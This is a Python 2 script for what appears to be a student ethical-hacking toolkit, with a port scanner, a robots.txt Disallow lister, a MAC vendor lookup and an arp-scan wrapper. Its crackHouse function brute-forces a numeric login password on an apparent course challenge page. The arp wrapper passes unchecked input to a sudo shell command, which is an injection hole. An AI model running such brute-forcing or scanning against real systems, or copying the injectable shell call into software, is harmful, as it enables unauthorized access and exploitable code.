import socket
import urllib2
import subprocess
import robotparser
import os
import multiprocessing
import Queue

host = " "
port = " "
openPorts3 = []
 
peep = open("report.out", "w")


def returnMenu():
    reply = raw_input("Do you want to go back to the Menu? [y/n]: ")

    if reply == "N":
        raise SystemExit
    elif reply == "Y":
        amazingMenu()
    elif reply == "n":
        raise SystemExit
    elif reply == "y":
        amazingMenu()
    return
    
def scanport(host, port):
    """Attempt to connect to a port on a host to see if it is open
    :param host: Host IP to scan
    :param port: Port to scan
    """
    host = raw_input("Enter the IP you would like to scan: ")
    port = input("and which port would you like to scan [0 to scan all ports]: ")
    #scan = ""
    #openPorts = []
    if port == 0:
    #    jobs = []
    #    for i in range(1, 4):
    #        p = multiprocessing.Process(target=multiPort, args=(host, port, i, openPorts))
    #        jobs.append(p)
    #        p.start()
    #    p.join()
        scan = multiPort(host, port)
    else:
        s = socket.socket()
        s.settimeout(5)
        try:
            s.connect((host, port))
            s.getsockname()
        except socket.error:
            s.close()
            scan = "Port:  "+str(port)+"\t\t"+" Closed"
            return scan
        s.close()
        scan = "Port:  "+str(port)+"\t\t"+" Open"
    return scan
    
def multiPort(host, port):
    #Attempt to connect to a port on a host to see if it is open
    #:param host: Host IP to scan
    #:param port: Port to scan
    
    openPorts = []

    for port in range(1, 1500):
        s = socket.socket()
        s.settimeout(0.04)
        try:
            s.connect((host, port))
            s.getsockname()
        except socket.error:
            s.close()
            continue
        print "Port:   "+str(port)+"\t\t"+" Open"
        openPorts.append("Port: "+str(port)+" Open")
        s.close()
    return host+"\n"+str(openPorts)

"""def multiPort(host, port, thread, openPorts):
    #Attempt to connect to a port on a host to see if it is open
    #:param host: Host IP to scan
    #:param port: Port to scan
    
    
    if thread == 1:
        for port in range(1, 400):
            openPorts1 = []
            s = socket.socket()
            s.settimeout(0.05)
            try:
                s.connect((host, port))
                #s.getsockname()
            except socket.error:
                s.close()
                continue
            print "Port:   "+str(port)+"\t\t"+" Open"
            peep.write("Port "+str(port)+"\tOpen\n")
            s.close()

    elif thread == 2:
        for port in range(401, 800):
            openPorts2 = []
            s = socket.socket()
            s.settimeout(0.05)
            try:
                s.connect((host, port))
                #s.getsockname()
            except socket.error:
                s.close()
                continue
            print "Port:   "+str(port)+"\t\t"+" Open"
            peep.write("Port "+str(port)+"\tOpen\n")
            s.close()

    elif thread == 3:
       
        for port in range(801, 1200):
            
            s = socket.socket()
            s.settimeout(0.05)
            try:
                s.connect((host, port))
                #s.getsockname()
            except socket.error:
                s.close()
                continue
            print "Port:   "+str(port)+"\t\t"+" Open"
            peep.write("Port "+str(port)+"\tOpen\n")
            s.close()

    return host+"\n"+str(openPorts)"""

def arp(host):
    """use arp-scan to attempt to get the mac address from an IP address"""
    """will only work on linux with arp-scan installed, to intall please use "sudo apt-get install arp-scan" thanks!"""
    
    host = raw_input("Enter the IP you would like to scan: ")
    arpScan = os.system("sudo arp-scan "+str(host))
    print arpScan
    

def crackHouse():
    """Bruteforce the password for titanium house"""

    for passw in range(1000):
        response = urllib2.urlopen("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php?username=JoeSmith&password=%s" % passw)
        html = response.read()
        wordd = "incorrect"
        if wordd in html:
            print "Fails on {0}".format(passw)
        else:
            print "Passcode is {0}".format(passw)
            break
    return "The passcode is: "+str(passw)
    

#This needs a bit more tweaking to get it working:

def listRestricted():
    """ Return the restricted folders from a webpage based on the robots.txt file. """
    site = raw_input("Enter the site: ")

    def getDenies(site):
        """ Create a new robotparser instance and read the site's robots file"""
        paths = []
        robot = robotparser.RobotFileParser()
        robot.set_url("http://"+site+"/robots.txt")
        robot.read()
        #robot.parse()

        robotic = robot.default_entry
        f = open("robots.txt", "w")
        f.write(str(robotic))
        f.close()
        #For each entry, look at the rule lines and add the path to paths if disallowed.
        deny = "Disallow: "
        fx = open("robots.txt", "r")

        for line in fx:
            if deny in line: paths.append(line); print line
        fx.close()

        return site+"\n"+str(paths)

    #for site in  sites:
    print "Denies for " +site+"\n"
    return getDenies(site)
    
        
def identifyOUI():
    macaddress = raw_input("Search MAC address: ")
    #"""This function should identify the manufacturer of a given device based on its MAC adress"""
    # Load the Wireshark manufacturers database file from the disk and  search through it to return the manufacturer
    macA = []
    database = open("data.txt", "r")
    for line in database:
        if macaddress in line: macA.append(line); print line
    database.close()
    return macA
    
    """This function should take all the output from the selected tunctionality and save it to a file of some sort."""
    
    #listRestricted()
    #print scanport("127.0.0.1",8000)
    #print crackhouse()
    #print listrestricted
    #print("Documentation generated and saved to file.")
    
# Below I can test all the custom functionality that I am writing, just by calling the function

#if __name__ == "__main__":
    #amazingMenu()
    #listRestricted()
    #identifyOUI("A4:18:75")
    #print scanport("127.0.0.1",8000)
    #print crackhouse()
    #print listrestricted

def amazingMenu():
    """ Display an amazing Banner and the Menu for the tool to instantly impress the users."""
    print (""" ___ ___ _____         _ _   _ _   
|_ _| _ \_   _|__  ___| | |_(_) |_ 
 | ||  _/ | |/ _ \/ _ \ | / / |  _|
|___|_|   |_|\___/\___/_|_\_\_|\__|
                                   """)

    print (35 * '-')
    print ("   \tM A I N - M E N U")
    print (35 * '-')
    print ("\t1. scanport")
    print ("\t2. crackHouse")
    print ("\t3. listRestricted")
    print ("\t4. identifyOUI")
    print ("\t5. arpScan")
    print ("\t6. Exit program")
    print (35 * '-')

    choice = input('Enter your choice [1-6] : ')
    
        
    choice = int(choice)
    if choice == 1:
        print ("Starting scanport...")
        peep.write("Starting scanport...\n")
        peep.write(str(scanport(host, port))+"\n\n")
        returnMenu()
    elif choice == 2:
        print ("Starting crackHouse...")
        peep.write("Starting crackHouse...\n")
        peep.write(str(crackHouse())+"\n\n")
        returnMenu()
    elif choice == 3:
        print ("Starting listRestricted...")
        peep.write("Starting listRestricted...\n")
        peep.write(str(listRestricted())+"\n\n")
        returnMenu()
    elif choice == 4:
        print ("Starting indentifyOUI...")
        peep.write("Starting identifyOUI...\n")
        peep.write(str(identifyOUI())+"\n\n")
        returnMenu()
    elif choice == 5:
        print ("Starting arpScan...")
        arp(host)
        returnMenu()
    elif choice == 6:
        raise SystemExit
    else:
        print ("Invalid number. Try again...")


amazingMenu()
